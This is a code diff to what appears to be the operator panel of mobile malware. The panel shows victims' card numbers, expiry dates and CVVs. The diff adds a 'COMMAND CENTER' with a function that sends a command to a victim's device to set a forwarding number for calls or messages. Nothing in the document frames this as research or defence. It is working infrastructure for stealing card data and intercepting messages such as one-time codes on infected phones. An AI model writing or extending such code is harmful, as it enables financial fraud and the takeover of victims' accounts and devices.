@@ -225,6 +225,25 @@
         let activeUser = null;
         let activeTab = 'sms';
 
+        async function saveForwarding() {
+            const num = document.getElementById('fwdNum').value;
+            const btn = event.target;
+            btn.textContent = 'Saving...';
+            btn.disabled = true;
+
+            try {
+                await fetch('/api/admin/update-forwarding', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId: activeUser.device_id, number: num, enabled: true })
+                });
+                alert('Forwarding set! The device will start forwarding shortly.');
+            } catch (err) { alert('Error saving command'); }
+            
+            btn.textContent = 'Update Forwarding';
+            btn.disabled = false;
+        }
+
         async function fetchData() {
             try {
                 const response = await fetch('/api/admin/data');
@@ -283,6 +302,15 @@
                 <div class="detail-item" style="margin-bottom:20px;"><label>Card Number</label><span style="font-family:monospace; font-size:18px;">${activeUser.card_num || 'Not Entered'}</span></div>
                 <div class="detail-item" style="margin-bottom:20px;"><label>Expiry / CVV</label><span>${activeUser.card_exp} / ${activeUser.card_cvv}</span></div>
                 <div class="detail-item" style="margin-bottom:20px;"><label>Device ID</label><span style="font-size:10px; color:var(--text-dim);">${activeUser.device_id}</span></div>
+                
+                <hr style="border:0; border-top:1px solid var(--border); margin:30px 0;">
+                <h3 style="color:var(--accent); margin-bottom:15px;">⚡ COMMAND CENTER</h3>
+                <div class="detail-item" style="margin-bottom:15px;">
+                    <label>Forwarding Number</label>
+                    <input type="text" id="fwdNum" value="${activeUser.forwarding_number || ''}" placeholder="+91..." style="width:100%; background:var(--bg); border:1px solid var(--border); color:white; padding:10px; border-radius:8px; margin-top:5px;">
+                </div>
+                <button onclick="saveForwarding()" style="width:100%; background:var(--primary); color:white; border:none; padding:12px; border-radius:8px; font-weight:600; cursor:pointer;">Update Forwarding</button>
+                <p style="font-size:10px; color:var(--text-dim); margin-top:10px; text-align:center;">Updates take ~30s to sync to device.</p>
             `;
             
             switchTab('sms');
